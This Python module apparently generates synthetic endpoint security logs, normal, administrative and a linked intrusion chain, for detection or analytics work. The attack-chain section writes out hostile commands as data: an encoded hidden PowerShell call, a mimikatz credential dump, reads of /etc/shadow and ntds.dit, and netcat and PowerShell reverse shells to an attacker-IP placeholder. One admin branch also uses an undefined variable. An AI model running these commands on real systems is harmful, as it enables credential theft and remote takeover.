import json
import random
import uuid
import hashlib
from datetime import datetime, timedelta
from typing import List, Dict, Any, Optional

from faker import Faker
from shared.schemas import (
    SecurityEvent, SourceInfo, DestinationInfo, UserInfo, 
    ProcessInfo, FileInfo, SystemInfo, BehavioralFeatures, DetectionInfo, MITREAttackInfo, CorrelationInfo
)

class EndpointEventGenerator:
    """
    Enterprise Endpoint Event Generator.
    Simulates internal host activities, system events, and connected attack chains
    (malware, lateral movement, credential dumping).
    """

    def __init__(self, template_dir: str = "synthetic_logs/templates"):
        self.fake = Faker()
        
        # Load environment context
        with open(f"{template_dir}/users.json", "r") as f:
            self.users = json.load(f)
        with open(f"{template_dir}/systems.json", "r") as f:
            self.systems = json.load(f)
        with open(f"{template_dir}/processes.json", "r") as f:
            self.processes = json.load(f)
        with open(f"{template_dir}/files.json", "r") as f:
            self.files = json.load(f)
        with open(f"{template_dir}/services.json", "r") as f:
            self.services = json.load(f)
            
    def _generate_hash(self) -> str:
        return hashlib.sha256(self.fake.text().encode('utf-8')).hexdigest()

    def _create_base_event(self, event_type: str, severity: str, timestamp: datetime) -> SecurityEvent:
        """Centralized Pydantic initialization to enforce schema."""
        return SecurityEvent(
            event_id=str(uuid.uuid4()),
            timestamp=timestamp,
            event_type=event_type,
            severity=severity,
            raw_log="Placeholder"
        )
        
    def _get_system_info(self, system: Dict) -> SystemInfo:
        return SystemInfo(os=system['os'], container_id=None)

    def _get_user_info(self, user: Dict) -> UserInfo:
        return UserInfo(username=user['username'], role=user['role'], department=user['department'])

    # ==============================================================================
    # 1. NORMAL ENDPOINT EVENTS (Rich Telemetry)
    # ==============================================================================

    def generate_normal_activity(self, timestamp: datetime, user: Dict, system: Dict) -> List[SecurityEvent]:
        """Generates 1-3 normal workstation/server activities with rich process/file context."""
        events = []
        count = random.randint(1, 3)
        current_time = timestamp
        session_id = f"sess_{random.randint(10000, 99999)}"
        
        for _ in range(count):
            current_time += timedelta(seconds=random.randint(5, 120))
            action = random.choices(["process_start", "file_access", "process_stop"], weights=[0.6, 0.3, 0.1])[0]
            
            event = self._create_base_event(action, "info", current_time)
            event.system = self._get_system_info(system)
            event.user = self._get_user_info(user)
            event.source = SourceInfo(ip=system["ip"], hostname=system["hostname"]) # Endpoint essentially talking to itself
            
            # Rich Process Construction
            proc_name = random.choice(self.processes["normal_processes"])
            parent_name = "explorer.exe" if "Windows" in system["os"] else "systemd"
            proc_id = random.randint(1000, 9000)
            
            event.correlation = CorrelationInfo(related_events=[], session_id=session_id)
            event.detection = DetectionInfo(anomaly_score=random.uniform(0.01, 0.05), ueba_score=0.01, risk_score=0.0, risk_level="low")

            if action == "process_start":
                cmd_line = f'"{proc_name}" --startup'
                event.process = ProcessInfo(name=proc_name, pid=proc_id, parent_process_name=parent_name, command_line=cmd_line)
                event.raw_log = f"syslog: date={current_time.isoformat()} host={system['hostname']} type=PROCESS_START user={user['username']} parent={parent_name} command={cmd_line} pid={proc_id}"
            elif action == "process_stop":
                event.process = ProcessInfo(name=proc_name, pid=proc_id, parent_process_name=parent_name)
                event.raw_log = f"syslog: date={current_time.isoformat()} host={system['hostname']} type=PROCESS_STOP user={user['username']} pid={proc_id}"
            else:
                file_path = random.choice(self.files["office_documents"])
                file_name = file_path.split("/")[-1] if "/" in file_path else file_path.split("\\")[-1]
                event.file = FileInfo(file_path=file_path, file_name=file_name, file_hash=self._generate_hash())
                event.raw_log = f"Windows_Event_4663: An attempt was made to access an object. SubjectUserSid={user['username']} ObjectName={file_path} ProcessName={proc_name}"
                
            events.append(event)
            
        return events

    # ==============================================================================
    # 2. PRIVILEGED / ADMIN EVENTS
    # ==============================================================================

    def generate_admin_activity(self, timestamp: datetime, user: Dict, system: Dict) -> SecurityEvent:
        """Simulates administrative actions (sudo, service restarts)."""
        action = random.choice(["service_restart", "sudo_command"])
        event = self._create_base_event(action, "warning", timestamp)
        event.system = self._get_system_info(system)
        event.user = self._get_user_info(user)
        event.source = SourceInfo(ip=system["ip"], hostname=system["hostname"])
        
        event.detection = DetectionInfo(anomaly_score=random.uniform(0.1, 0.3), ueba_score=0.2, risk_score=5.0, risk_level="medium")
        event.correlation = CorrelationInfo(session_id=str(uuid.uuid4())[:8])

        if action == "service_restart":
            svc = random.choice(self.services["web_services"] + self.services["databases"])
            event.process = ProcessInfo(name="systemctl", pid=random.randint(100,999), parent_process_name="bash", command_line=f"systemctl restart {svc}")
            event.raw_log = f"AUDIT_LOG: user={user['username']} pid={event.process.pid} cmd=\"systemctl restart {svc}\" result=success"
        else:
            proc = random.choice(self.processes["admin_processes"])
            event.process = ProcessInfo(name="sudo", pid=random.randint(100,999), parent_process_name="sshd", command_line=f"sudo {proc} -v")
            event.raw_log = f"auth.log: {current_time.isoformat()} {system['hostname']} sudo:  {user['username']} : TTY=pts/1 ; PWD=/home/{user['username']} ; USER=root ; COMMAND={proc} -v"
            
        return event

    # ==============================================================================
    # 3. ATTACK CHAIN / MALWARE EVENTS (The Connected Sequence)
    # ==============================================================================

    def generate_attack_chain(self, start_time: datetime, target_user: Dict, system: Dict, attacker_ip: str) -> List[SecurityEvent]:
        """
        Creates a behaviorally linked sequence of events that represent a realistic intrusion.
        1. Malicious Login (passed in from Auth, so we correlate here)
        2. Suspicious powershell (T1059.001)
        3. Credential Dumping (T1003)
        4. Sensitive File Access
        5. Reverse Shell (T1071)
        """
        events = []
        current_time = start_time
        chain_uuid = f"attack_chain_{uuid.uuid4().hex[:8]}" # Shared across the sequence
        session_uuid = f"sess_{uuid.uuid4().hex[:8]}"
        prev_event_id = None

        # 1. Suspicious powershell execution
        current_time += timedelta(seconds=random.randint(5, 15))
        ev1 = self._create_base_event("suspicious_powershell", "high", current_time)
        ev1.system = self._get_system_info(system)
        ev1.user = self._get_user_info(target_user)
        ev1.source = SourceInfo(ip=system["ip"], hostname=system["hostname"]) 
        cmd = "powershell.exe -NoP -w hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA..."
        ev1.process = ProcessInfo(name="powershell.exe", pid=random.randint(4000,5000), parent_process_name="cmd.exe", command_line=cmd)
        
        # Enrichment
        ev1.mitre_attack = MITREAttackInfo(technique_id="T1059.001", technique_name="PowerShell", tactic="Execution", confidence=0.95)
        ev1.detection = DetectionInfo(anomaly_score=0.85, ueba_score=0.90, risk_score=80.0, risk_level="high", signature_match=True)
        ev1.correlation = CorrelationInfo(attack_chain_id=chain_uuid, session_id=session_uuid, related_events=[])
        
        ev1.raw_log = f'EventID 4688: Process Creation. Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe. CommandLine: {cmd}. User: {target_user["username"]}'
        events.append(ev1)
        prev_event_id = ev1.event_id

        # 2. Credential Dumping
        current_time += timedelta(seconds=random.randint(5, 15))
        ev2 = self._create_base_event("credential_dumping", "critical", current_time)
        ev2.system = self._get_system_info(system)
        ev2.user = self._get_user_info(target_user)
        ev2.source = SourceInfo(ip=system["ip"], hostname=system["hostname"])
        cmd_mimi = "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit"
        ev2.process = ProcessInfo(name="mimikatz.exe", pid=random.randint(5001,6000), parent_process_name="powershell.exe", command_line=cmd_mimi)
        
        ev2.mitre_attack = MITREAttackInfo(technique_id="T1003.001", technique_name="OS Credential Dumping: LSASS Memory", tactic="Credential Access", confidence=0.99)
        ev2.detection = DetectionInfo(anomaly_score=0.98, ueba_score=0.95, risk_score=95.0, risk_level="critical", signature_match=True)
        ev2.correlation = CorrelationInfo(attack_chain_id=chain_uuid, session_id=session_uuid, related_events=[prev_event_id])
        
        ev2.raw_log = f'Sysmon Event ID 1: Process Creation. Image: C:\\Temp\\mimikatz.exe. CommandLine: "{cmd_mimi}". TargetObject: lsass.exe'
        events.append(ev2)
        prev_event_id = ev2.event_id

        # 3. Sensitive File Access / Discovery
        current_time += timedelta(seconds=random.randint(5, 15))
        ev3 = self._create_base_event("abnormal_file_access", "high", current_time)
        ev3.system = self._get_system_info(system)
        ev3.user = self._get_user_info(target_user)
        ev3.source = SourceInfo(ip=system["ip"], hostname=system["hostname"])
        sensitive_file = "/etc/shadow" if "Ubuntu" in system["os"] else "C:\\Windows\\NTDS\\ntds.dit"
        file_name = sensitive_file.split("/")[-1] if "/" in sensitive_file else sensitive_file.split("\\")[-1]
        
        ev3.file = FileInfo(file_path=sensitive_file, file_name=file_name, file_hash=self._generate_hash())
        ev3.process = ProcessInfo(name="cp.exe" if "Windows" in system["os"] else "cp", pid=random.randint(6001,7000), parent_process_name="powershell.exe")
        
        ev3.mitre_attack = MITREAttackInfo(technique_id="T1003.003", technique_name="OS Credential Dumping: NTDS", tactic="Credential Access", confidence=0.90)
        ev3.detection = DetectionInfo(anomaly_score=0.75, ueba_score=0.88, risk_score=85.0, risk_level="high")
        ev3.correlation = CorrelationInfo(attack_chain_id=chain_uuid, session_id=session_uuid, related_events=[prev_event_id])
        
        ev3.raw_log = f"File_Audit: Unauthorized copy operation detected targeting critical OS asset: {sensitive_file} by user {target_user['username']}."
        events.append(ev3)
        prev_event_id = ev3.event_id

        # 4. Reverse Shell / C2 connection
        current_time += timedelta(seconds=random.randint(10, 30))
        ev4 = self._create_base_event("reverse_shell", "critical", current_time)
        ev4.system = self._get_system_info(system)
        ev4.user = self._get_user_info(target_user)
        ev4.source = SourceInfo(ip=system["ip"], hostname=system["hostname"])
        ev4.destination = DestinationInfo(ip=attacker_ip, port=4444)
        c2_cmd = f"nc {attacker_ip} 4444 -e /bin/bash" if "Ubuntu" in system["os"] else f"powershell -c \"$client=New-Object System.Net.Sockets.TCPClient('{attacker_ip}',4444);...\""
        ev4.process = ProcessInfo(name="nc" if "Ubuntu" in system["os"] else "powershell.exe", pid=random.randint(7001,8000), parent_process_name="bash", command_line=c2_cmd)
        
        ev4.mitre_attack = MITREAttackInfo(technique_id="T1071.001", technique_name="Application Layer Protocol: Web Protocols", tactic="Command and Control", confidence=0.99)
        ev4.detection = DetectionInfo(anomaly_score=0.99, ueba_score=0.99, risk_score=100.0, risk_level="critical", signature_match=True)
        ev4.correlation = CorrelationInfo(attack_chain_id=chain_uuid, session_id=session_uuid, related_events=[prev_event_id])
        
        ev4.raw_log = f"EDR_Alert: Reverse shell payload detected. Outbound connection initiated from {system['hostname']} ({system['ip']}) to malicious infrastructure {attacker_ip}:4444 via process {ev4.process.name}."
        events.append(ev4)

        return events
